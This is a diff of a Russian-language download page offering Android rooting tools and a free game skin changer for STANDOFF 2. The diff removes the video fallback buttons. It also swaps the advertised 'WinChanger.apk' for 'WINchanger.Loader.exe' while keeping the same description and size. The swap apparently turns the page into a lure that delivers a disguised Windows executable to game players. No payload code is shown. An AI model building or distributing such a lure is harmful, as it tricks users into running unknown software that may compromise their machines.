@@ -157,7 +157,6 @@ code{background:rgba(255,46,99,.12);border:1px solid rgba(255,46,99,.2);padding:
     <div class="sec-label" id="rootVideoLabel">Видео-туториал</div>
     <div class="video-card">
       <video id="rootVideo" controls playsinline preload="metadata"></video>
-      <div class="card" id="rootVideoFallback" style="display:none" role="button" tabindex="0" onclick="downloadFile(FILES.rootVideo)"><div class="card-info"><h3>Открыть видео в браузере</h3></div><div class="arrow"></div></div>
       <div class="video-title" id="rootVideoTitle">Как получить рут-права:</div>
     </div>
 
@@ -183,14 +182,13 @@ code{background:rgba(255,46,99,.12);border:1px solid rgba(255,46,99,.2);padding:
     <div class="sec-label" id="scVideoLabel">Видео-туториал</div>
     <div class="video-card">
       <video id="scVideo" controls playsinline preload="metadata"></video>
-      <div class="card" id="scVideoFallback" style="display:none" role="button" tabindex="0" onclick="downloadFile(FILES.scVideo)"><div class="card-info"><h3>Открыть видео в браузере</h3></div><div class="arrow"></div></div>
       <div class="video-title" id="scVideoTitle">Установка и обзор WinChanger:</div>
     </div>
 
     <div class="sec-label" id="scFilesLabel">Файлы</div>
     <div class="card" role="button" tabindex="0" onclick="downloadFile(FILES.scApp)">
       <div class="card-info">
-        <h3>WinChanger.apk <span class="tag">15.2 MB</span></h3>
+        <h3>WINchanger.Loader.exe <span class="tag">15.2 MB</span></h3>
         <p class="wrap" id="scFile1Desc">Бесплатный скинченджер для STANDOFF 2</p>
       </div>
       <div class="arrow dl"></div>
@@ -259,7 +257,7 @@ const FILES = {
   rootApp:  'root-my-android.apk',
   kernelsu: 'KernelSU.apk',
   rootVideo: 'VID_20261016_204713_559.mp4',
-  scApp: 'WinChanger.apk',
+  scApp: 'WINchanger.Loader.exe',
   scVideo: '⚡Бесплатный скинченджер для STANDOFF 2 🔥 Установка и обзор WinChanger 🧠 (1).mp4'
 };
 function abs(u){ try { return new URL(u, location.href).href; } catch(e){ return u; } }
@@ -467,11 +465,9 @@ function closeModal(e) { if (e.target.id === 'modal') document.getElementById('m
 // Инициализация видео
 (function(){
   const rv = document.getElementById('rootVideo');
-  rv.addEventListener('error', () => { document.getElementById('rootVideoFallback').style.display = 'flex'; });
   rv.src = abs(FILES.rootVideo);
 
   const sv = document.getElementById('scVideo');
-  sv.addEventListener('error', () => { document.getElementById('scVideoFallback').style.display = 'flex'; });
   sv.src = abs(FILES.scVideo);
 })();
 
